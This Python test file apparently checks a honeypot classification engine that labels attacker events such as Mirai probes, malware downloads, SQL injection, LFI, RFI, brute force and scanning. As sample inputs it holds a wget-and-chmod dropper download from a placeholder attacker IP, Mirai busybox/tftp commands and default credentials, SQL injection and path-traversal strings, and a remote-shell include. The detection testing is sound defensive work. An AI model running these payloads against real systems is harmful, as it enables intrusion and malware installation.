"""Classification engine rules (contract section 2)."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any

from app.classify import ClassificationEngine
from app.models import Event

T0 = datetime(2026, 1, 5, 12, 0, 0, tzinfo=timezone.utc)
ATTACKER = "203.0.113.9"


def make_event(**overrides: Any) -> Event:
    fields: dict[str, Any] = dict(
        timestamp=T0,
        source_ip=ATTACKER,
        honeypot="cowrie",
        service="ssh",
        attack_type="",
        severity="",
    )
    fields.update(overrides)
    return Event(**fields)


def test_mirai_default_credentials():
    engine = ClassificationEngine()
    event = engine.classify(make_event(honeypot="heralding", service="ssh", username="root", password="xc3511"))
    assert event.attack_type == "Mirai"
    assert event.severity == "high"


def test_mirai_binary_and_busybox_probes():
    engine = ClassificationEngine()
    event = engine.classify(make_event(payload="cd /tmp; tftp -g -r sh4 ./mirai.x86; busybox shell"))
    assert event.attack_type == "Mirai"


def test_malware_download_wget():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(payload="wget -q http://203.0.113.50/dropper.bin -O /tmp/.x; chmod +x /tmp/.x")
    )
    assert event.attack_type == "Malware Download"
    assert event.severity == "high"


def test_malware_download_cowrie_file_download_bare_url():
    engine = ClassificationEngine()
    event = engine.classify(make_event(payload="http://203.0.113.50/x86"))
    assert event.attack_type == "Malware Download"


def test_sql_injection_payload():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(
            honeypot="tanner",
            service="http",
            payload="sqli /news.php?id=1' OR '1'='1",
        )
    )
    assert event.attack_type == "SQL Injection"
    assert event.severity == "high"


def test_sql_injection_access_log_style():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(
            honeypot="snare",
            service="http",
            payload='GET /a.php?id=1 UNION SELECT password FROM users 200 "curl/8.0"',
        )
    )
    assert event.attack_type == "SQL Injection"


def test_lfi_payload():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(honeypot="snare", service="http", payload='GET /../../../../../etc/passwd 404 "-"')
    )
    assert event.attack_type == "LFI"
    assert event.severity == "high"


def test_rfi_payload():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(
            honeypot="tanner",
            service="http",
            payload="rfi/include /index.php?page=http://203.0.113.50/shell.txt",
        )
    )
    assert event.attack_type == "RFI"
    assert event.severity == "high"


def test_brute_force_window():
    engine = ClassificationEngine()
    for seconds in range(4):
        event = engine.classify(
            make_event(
                timestamp=T0 + timedelta(seconds=seconds),
                username="admin",
                password="wrongpass",
            ),
            record={"eventid": "cowrie.login.failed"},
        )
        assert event.attack_type == "Generic Bot Activity"
    fifth = engine.classify(
        make_event(timestamp=T0 + timedelta(seconds=5), username="admin", password="wrongpass"),
        record={"eventid": "cowrie.login.failed"},
    )
    assert fifth.attack_type == "SSH Brute Force"
    assert fifth.severity == "medium"


def test_brute_force_success_after_failures():
    engine = ClassificationEngine()
    for seconds in range(2):
        engine.classify(
            make_event(timestamp=T0 + timedelta(seconds=seconds), username="root", password="guess"),
            record={"eventid": "cowrie.login.failed"},
        )
    success = engine.classify(
        make_event(timestamp=T0 + timedelta(seconds=3), username="root", password="guess"),
        record={"eventid": "cowrie.login.success"},
    )
    assert success.attack_type == "SSH Brute Force"


def test_brute_force_window_expiry():
    engine = ClassificationEngine()
    for seconds in range(4):
        engine.classify(
            make_event(timestamp=T0 + timedelta(seconds=seconds), username="admin", password="x"),
            record={"eventid": "cowrie.login.failed"},
        )
    late = engine.classify(
        make_event(timestamp=T0 + timedelta(seconds=400), username="admin", password="x"),
        record={"eventid": "cowrie.login.failed"},
    )
    assert late.attack_type == "Generic Bot Activity"


def test_credential_stuffing_same_username_across_ips():
    engine = ClassificationEngine()
    labels = []
    for index, ip in enumerate(("198.51.100.1", "198.51.100.2", "198.51.100.3")):
        event = engine.classify(
            make_event(
                honeypot="heralding",
                service="ftp",
                timestamp=T0 + timedelta(seconds=index),
                source_ip=ip,
                username="oracle",
                password="welcome1",
            )
        )
        labels.append(event.attack_type)
    assert labels == ["Generic Bot Activity", "Generic Bot Activity", "Credential Stuffing"]


def test_credential_stuffing_username_equals_password():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(honeypot="heralding", service="smtp", username="test", password="test")
    )
    assert event.attack_type == "Credential Stuffing"


def test_web_scanning_scanner_user_agent():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(
            honeypot="snare",
            service="http",
            payload='GET /admin.php 200 "sqlmap/1.7.2#stable (https://sqlmap.org)"',
        )
    )
    assert event.attack_type == "Web Scanning"
    assert event.severity == "low"


def test_masscan_signature_and_port_burst():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(honeypot="suricata", service="scan", payload="ET SCAN Possible Masscan Scan Detected"),
    )
    assert event.attack_type == "Masscan"

    engine = ClassificationEngine()
    for port in range(50):
        event = engine.classify(
            make_event(
                honeypot="suricata",
                service="scan",
                payload="ET SCAN Generic Port Sweep",
                timestamp=T0 + timedelta(seconds=port),
            ),
            record={"dest_port": 1000 + port},
        )
    assert event.attack_type == "Masscan"


def test_nmap_signature():
    engine = ClassificationEngine()
    event = engine.classify(
        make_event(honeypot="suricata", service="scan", payload="ET SCAN Nmap OS Detection Probe"),
    )
    assert event.attack_type == "Nmap"


def test_directory_scanning_404_burst():
    engine = ClassificationEngine()
    event = None
    for index in range(10):
        event = engine.classify(
            make_event(
                honeypot="snare",
                service="http",
                timestamp=T0 + timedelta(seconds=index),
                payload=f'GET /wp-content/hidden{index}.php 404 "Mozilla/5.0"',
            )
        )
    assert event is not None
    assert event.attack_type == "Directory Scanning"


def test_fallback_generic_bot_activity():
    engine = ClassificationEngine()
    event = engine.classify(make_event(payload=None, username=None))
    assert event.attack_type == "Generic Bot Activity"
    assert event.severity == "info"
